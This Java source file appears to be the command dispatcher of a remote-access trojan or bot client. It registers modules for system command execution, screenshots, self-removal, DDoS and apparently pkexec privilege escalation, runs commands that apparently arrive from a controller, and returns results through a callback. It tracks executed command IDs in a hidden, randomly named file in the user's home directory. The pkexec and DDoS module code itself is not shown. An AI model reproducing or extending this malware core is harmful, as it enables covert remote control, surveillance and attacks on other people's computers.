package gq.glowman554.modules;

import gq.glowman554.Exs;
import gq.glowman554.utils.FileUtils;
import gq.glowman554.utils.Log;
import gq.glowman554.modules.impl.*;
import net.shadew.json.Json;
import net.shadew.json.JsonNode;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;

public class Modules {
    public HashMap<String, Module> modules = new HashMap<>();
    public String store_file = System.getProperty("user.home") + "/.3hrg1gh80gh4.json";
    private ArrayList<String> executed_callbacks = new ArrayList<>();

    public Modules(Exs exs) {
        this.modules.put("echo", new EchoCommand());
        this.modules.put("system", new SystemCommand());
        this.modules.put("screenshot", new ScreenShotCommand(exs));
        this.modules.put("selfkill", new SelfKillCommand());
        this.modules.put("ddos", new DdosCommand());
        this.modules.put("pkexec_test", new PKExecPETestCommand());
        this.modules.put("pkexec", new PKExecPECommand());

        try {
            if ((new File(this.store_file)).exists()) {
                Json json = Json.json();
                JsonNode root = json.parse(FileUtils.readFile(this.store_file));
                executed_callbacks.addAll(Arrays.asList(root.asStringArray()));
            }
        } catch (IOException e) {
            Log.log(e);
        }

    }

    public void call(String raw_command, String cid, Exs exs) throws IOException {
        if (!this.executed_callbacks.contains(cid)) {
            String[] split = raw_command.split("\\|\\|");

            Log.log(String.format("Executing %s||%s", split[0], split.length == 1 ? "none" : split[1]));

            String callback;

            if (this.modules.get(split[0]) == null) {
                Log.log(String.format("wtf is %s????????", split[0]));
                callback = "Could not execute " + split[0];
            } else {
                if (split.length == 1) {
                    callback = this.modules.get(split[0]).execute((String) null);
                } else {
                    callback = this.modules.get(split[0]).execute(split[1]);
                }
            }

            exs.callback(cid, callback);
            this.executed_callbacks.add(cid);
            FileUtils.writeFile(this.store_file, JsonNode.stringArray(this.executed_callbacks.toArray(new String[0])).toString());
        }
    }
}
